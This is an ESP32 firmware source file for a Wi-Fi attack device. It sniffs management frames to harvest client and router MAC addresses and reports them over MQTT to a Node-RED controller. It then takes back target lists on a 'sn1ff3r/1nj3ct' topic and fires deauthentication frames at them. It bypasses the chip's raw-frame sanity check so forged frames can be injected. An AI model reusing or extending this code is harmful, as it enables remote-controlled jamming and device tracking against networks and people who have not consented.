#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "string.h"
#include "cJSON.h"
#include "mqtt.h"
#include "esp_sntp.h"
#include <time.h>
#include <sys/time.h>
#include "esp_system.h"
#include "lwip/ip_addr.h"
#include "freertos/event_groups.h"
#include "mqtt_client.h"
#include "credentials.h"
#include "events.h"
#include "rcvd_payload.h"
#include "deauth.h"

#define MAX_BUFFER_SIZE 30 // maximum number of packets to store in the queue
#define MAC_BATCH_LEN  8192

static const char *TAG = "SNIFFER";

// wifi - ip event group to prevent mqtt from init before wifi connects and time syncs
EventGroupHandle_t s_evt;

// Defined in events.h
volatile bool allow_connection = false;
volatile bool sntp_initialized = false;

// DEFINED IN MQTT.H 
esp_mqtt_client_handle_t client = NULL;  

QueueHandle_t mac_queue;
QueueHandle_t inject_queue;
SemaphoreHandle_t inject_sem; 

int dropped_packets = 0; // counter for dropped packets due to queue overflow
int total_queued = 0; // counter for total packets successfully queued

const wifi_promiscuous_filter_t filt = {
	.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
};

// BYPASS SANITY CHECK
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }


//---------------------------------------CALL BACK FUNCTION FOR SNIFFER------------------------------------------

static void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {

    ESP_LOGI(TAG, "Promiscuous callback triggered.");

    // details aside from dest and src mac are irrelevant for now 
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    
    uint8_t *p = (uint8_t *)pkt->payload; // pointer to the payload of the packet 
    uint8_t source_mac[6];
    memcpy(source_mac, p + 10, 6); 
    uint8_t dest_mac[6];
    memcpy(dest_mac, p + 4, 6); // destination MAC address of the packet

    // ALSO SAVE THE BSSID IN MAC PAIR_t 

    mac_pair_t rcvd;
    memcpy(rcvd.source_mac, source_mac, 6);
    memcpy(rcvd.dest_mac, dest_mac, 6);    

    // save MAC addresses of clients/routers in FIFO memory queue (in ESP32 Internal SRAM)
    if (xQueueSend(mac_queue, &rcvd, 0) == errQUEUE_FULL) { // timeout 0 means it will return immediately if the queue is full, without blocking
        dropped_packets++;
        ESP_LOGW(TAG, "Queue full, dropped packet. Total dropped: %d", dropped_packets);
    } else {
        total_queued++;
        if (total_queued == MAX_BUFFER_SIZE)
            xEventGroupSetBits(s_evt, MAC_BUFFER_FULL_BIT); // signal to main that buffer is full and we can continue 
        ESP_LOGI(TAG, "Packet enqueued. Total queueed: %d", total_queued);
    }
}

// only use esp log and printf, never serial.begin or serial.print (using arduino as esp-idf component, not arduino ide)

void flash(void) {
    // GOAL : ADD ABILITY FOR OTA UPDATES FOR EITHER FIRMWARE (CODE LOGIC BINARY)
    // AND FOR UPDATING WIFI OR CA.CRT FROM MY PC
    // SEARCH FOR UPDATES AT THE START OF A WAKE CYCLE
    // WORK ON THIS AFTER WRITING THE WHOLE CODE LOGIC
 
    // RUNS DURING PRODUCTION TO CONFIGURE THE PARTITION 
    // mount NVS storage specifically for network credentials
    // protects network access with over the air updates

    // -------------- RUN ONCE TO WRITE CREDENTIALS TO NVS STORAGE, THEN COMMENT OUT ----------------
    // ------------- NOTE: pio run -t erase CLEARS CREDENTIALS ----------

    // NVS Storage Disabled to prevent flash wear  
    // init nvs space only for wifi credentials for mqtt - ota update for firmware or credentials 
    esp_err_t err = nvs_flash_init_partition("wifi_nvs");
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND){
        // nvs corrupted, clear it before re-initializing
        ESP_ERROR_CHECK(nvs_flash_erase());
        err = nvs_flash_init();
    }
    // for fatal errors like ESP_ERR_NO_MEM or ESP_ERR_NOT_FOUND, the ESP_ERROR_CHECK macro will print the error and abort 
    ESP_ERROR_CHECK(err);

    nvs_handle_t wifi_handle; 

    // MAKE WIFI CREDENTIALS PERSISTENT IN FLASH
    if (nvs_open_from_partition("wifi_nvs","storage", NVS_READWRITE, &wifi_handle) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to open NVS storage for Wi-Fi credentials.");
        return; 
    } 
    
    nvs_set_str(wifi_handle, "ssid", WIFI_SSID); 
    nvs_set_str(wifi_handle, "password", WIFI_PASSWORD);
    nvs_commit(wifi_handle); 
    nvs_close(wifi_handle); 


    ESP_LOGI(TAG, "credentials stored");

    // todo - add partition for certificate updates ??? 
}

void get_wifi_creds(void){

    nvs_handle_t wifi_handle; 

    // then only read the credentials from nvs storage for wifi connection, and never write to it again.
    ESP_ERROR_CHECK(nvs_open_from_partition("wifi_nvs", "storage", NVS_READONLY, &wifi_handle));
    wifi_config_t wc = {0};

    // read ssid 
    size_t len = sizeof(wc.sta.ssid);
    ESP_ERROR_CHECK(nvs_get_str(wifi_handle, "ssid", (char *)wc.sta.ssid, &len));
    len = sizeof(wc.sta.password);
    
    // read password
    ESP_ERROR_CHECK(nvs_get_str(wifi_handle, "password", (char *)wc.sta.password, &len));
    nvs_close(wifi_handle);

    wc.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wc));
    ESP_ERROR_CHECK(esp_wifi_start()); // wifi driver stays on

    ESP_LOGI(TAG, "Retrieved Wi-Fi credentials from NVS: SSID=%s", wc.sta.ssid);
}

extern void app_main(void) {

    // run once - add provisioning? 
    //flash();

    // --------------------------- INITIALIZATION BLOCK / RUN ONCE PER BOOT -----------------------------------

    ESP_LOGI(TAG, "Booting...");

    ESP_ERROR_CHECK(esp_netif_init());                      // initialize underlying tcp/ip stack 
    ESP_ERROR_CHECK(esp_event_loop_create_default());       // initialize event loop for tcp/ip stack
    esp_netif_create_default_wifi_sta();                    // creates a default network interface instance for a Wi-Fi Station (STA) mode, binding the Wi-Fi driver to the TCP/IP stac
    ESP_LOGI(TAG, "Initialized TCP/IP stack and event loop.");
    
    // ready to create a configuration object for the wifi driver
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg)); 

    // init mac pair queue
    mac_queue = xQueueCreate(MAX_BUFFER_SIZE, sizeof(mac_pair_t)); 
    s_evt = xEventGroupCreate();

    // init inject payload queue
    inject_queue = xQueueCreate(MAX_TARGETS, sizeof(char*));
    inject_sem = xSemaphoreCreateMutex();
    if (inject_sem == NULL) {
        ESP_LOGE("MAIN", "Failed to create Mutex");
        return;
    }

    // SET EVENT HANDLERS FOR WIFI AND IP
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                    ESP_EVENT_ANY_ID,
                                                    &wifi_event_handler,
                                                    NULL,
                                                    NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                    IP_EVENT_STA_GOT_IP,
                                                    &ip_event_handler,
                                                    NULL,
                                                    NULL));

    get_wifi_creds();
    mqtt_init();

    //----------------------------- INITIALIZE WORKER TASK -----------------------------

    // disable mbedtls log 
    esp_log_level_set("mbedtls", ESP_LOG_ERROR);   // or ESP_LOG_ERROR to keep errors only
    esp_log_level_set("esp-tls", ESP_LOG_ERROR);               
    esp_log_level_set("esp-tls-mbedtls", ESP_LOG_ERROR);

    int n = 0;

    char *rcvd_inject_payload;
    int processed_inject_payloads = 0;
    inject_array_count = 0;

    while(1) {

        total_queued = 0;
        dropped_packets = 0;
        xEventGroupClearBits(s_evt, MAC_BUFFER_FULL_BIT | ASSIGNED_IP_BIT | MQTT_PUBLISHED_BIT | MQTT_CONNECTED_BIT | MQTT_SUBSCRIBED_BIT);

        // ------------------------ STATE 1: SNIFFER MODE ------------------------

        ESP_LOGI("MODE", "SNIFFER");

        // TODO: IMPLEMENT CHANNEL HOPPING 
        // esp_wifi_set_channel();
        allow_connection = false;
        esp_wifi_disconnect();

        // ------------- enable promiscuous mode and set the callback function to save raw bytes in circular buffer ---------------

        // set promiscuous mode filter for management frames only 
        ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filt)); 
        ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(wifi_promiscuous_cb)); // default channel 1, IMPLEMENT CHANNEL HOPPING LATER
        ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

        // block until mac buffer full. (see callback func)
        xEventGroupWaitBits(s_evt, MAC_BUFFER_FULL_BIT, pdFALSE, pdTRUE, portMAX_DELAY);

        ESP_LOGI(TAG, "--- 10 PACKETS CAPTURED, SWITCHING TO STA ---");
        ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false)); // stop capturing packets when buffer is full

        // ---------------------------- PART 2. FORMAT INTO JSON AND SEND OVER NANOMQ TO NODE RED ----------------------------------

        allow_connection = true; 
        esp_wifi_connect();

        // wait until connected to wifi and time synced before mqtt connection
        xEventGroupWaitBits(s_evt, ASSIGNED_IP_BIT, pdFALSE, pdTRUE, portMAX_DELAY);
        esp_mqtt_client_start(client); 
        xEventGroupWaitBits(s_evt, MQTT_CONNECTED_BIT, pdFALSE, pdTRUE, portMAX_DELAY);

        ESP_LOGI(TAG, "--- STARTED MQTT & PUBLISHING ---");

        static char mac_batch[MAC_BATCH_LEN];

        cJSON *mac_arr = cJSON_CreateArray();
        if (!mac_arr) { ESP_LOGE(TAG, "no mem"); return; } // prevent memory leak

        mac_pair_t pair; 
        char src[18], dst[18]; 
        int count = 0;

        while (count < MAX_BUFFER_SIZE && xQueueReceive(mac_queue, &pair, 0) == pdTRUE) {

            uint8_t* m = pair.source_mac;
            snprintf(src, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0], m[1], m[2], m[3], m[4], m[5]);

            m = pair.dest_mac;
            snprintf(dst, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0], m[1], m[2], m[3], m[4], m[5]);

            cJSON *obj = cJSON_CreateObject();
            if (!obj) { ESP_LOGW(TAG, "no mem at element %d", count); break; } // prevent memory leak

            cJSON_AddStringToObject(obj, "src", src);
            cJSON_AddStringToObject(obj, "dst", dst);
            cJSON_AddItemToArray(mac_arr, obj);   // arr owns obj
            count++;
        }

        if (count > 0) {
            if (cJSON_PrintPreallocated(mac_arr, mac_batch, MAC_BATCH_LEN, false)) {
                int id = esp_mqtt_client_publish(client, MQTT_MAC_TOPIC, mac_batch, 0, 1,1); // retain flag set
                ESP_LOGI(TAG, "published %d pairs, msg_id=%d", count, id);
            } else {
                ESP_LOGE(TAG, "JSON buffer too small");
            }
        }
        cJSON_Delete(mac_arr);
       
        // wait for mqtt publishing to finish 
        xEventGroupWaitBits(s_evt, MQTT_PUBLISHED_BIT, pdFALSE, pdTRUE, portMAX_DELAY);
        ESP_LOGI(TAG, "--- PUBLISH COMPLETE ---");

        // ----------------------------- 3. RECEIVE COMMANDS AND INJECT TARGETS WITH DEAUTH FRAMES ---------------------------------

        xEventGroupWaitBits(s_evt, MQTT_SUBSCRIBED_BIT, pdFALSE, pdTRUE, portMAX_DELAY);
        ESP_LOGI(TAG, "--- SUBSCRIBED TO sn1ff3r/1nj3ct. CHECKING FOR TARGETS ---");
        esp_mqtt_client_publish(client, "sn1ff3r/r34dy", "READY", 0, 1, 0); // node-red ready to send potential targets , resets after 1 second 

        if (xQueueReceive(inject_queue, &rcvd_inject_payload, pdMS_TO_TICKS(2000))) { // wait for 2 sec to receive any target messages
            process_payload(rcvd_inject_payload);
            processed_inject_payloads++;
            
            // drain the rest of the burst rapidly
            while(processed_inject_payloads < MAX_TARGETS && xQueueReceive(inject_queue, &rcvd_inject_payload, pdMS_TO_TICKS(500)) == pdTRUE) {
                process_payload(rcvd_inject_payload); 
                processed_inject_payloads++;
            }
            ESP_LOGI("INJECT", "Batch download complete. Total valid unique pairs loaded: %d", inject_array_count);
        } else {
            ESP_LOGI("INJECT", "NO PAYLOADS THIS LOOP");
        }

        esp_mqtt_client_stop(client); // frees tls handshake heap mem 
        esp_wifi_disconnect();

        // INJECT HERE
        print_inject_array();
        vTaskDelay(pdMS_TO_TICKS(3000));

        DEAUTHENTICATE(); 

        ESP_LOGI(TAG, "Free heap: %u", esp_get_free_heap_size()); // heap handled safely, oscillates slightly, doesn't shrink ! 
        n++;

        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}
